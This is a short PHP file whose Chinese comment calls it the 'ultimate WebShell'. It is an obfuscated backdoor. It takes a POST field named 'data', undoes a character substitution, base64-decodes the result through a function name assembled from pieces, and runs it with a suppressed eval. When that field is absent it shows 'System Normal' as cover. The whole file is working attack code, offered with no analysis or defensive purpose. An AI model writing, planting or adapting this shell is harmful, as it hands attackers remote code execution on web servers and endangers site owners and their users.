<?php
// 结合两者优势的终极WebShell
$p = $_POST;
$a = 'a'; $t = 't';
$param = 'd' . $a . $t . $a;
if(isset($p[$param])){
    $d = $p[$param];
    $m = ["|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"="];
    $r = strtr($d, $m);
    $f = "base" . "64" . "_" . "decode";
    $c = $f($r);
    @eval($c);
}else{
    echo "System Normal";
}
?>
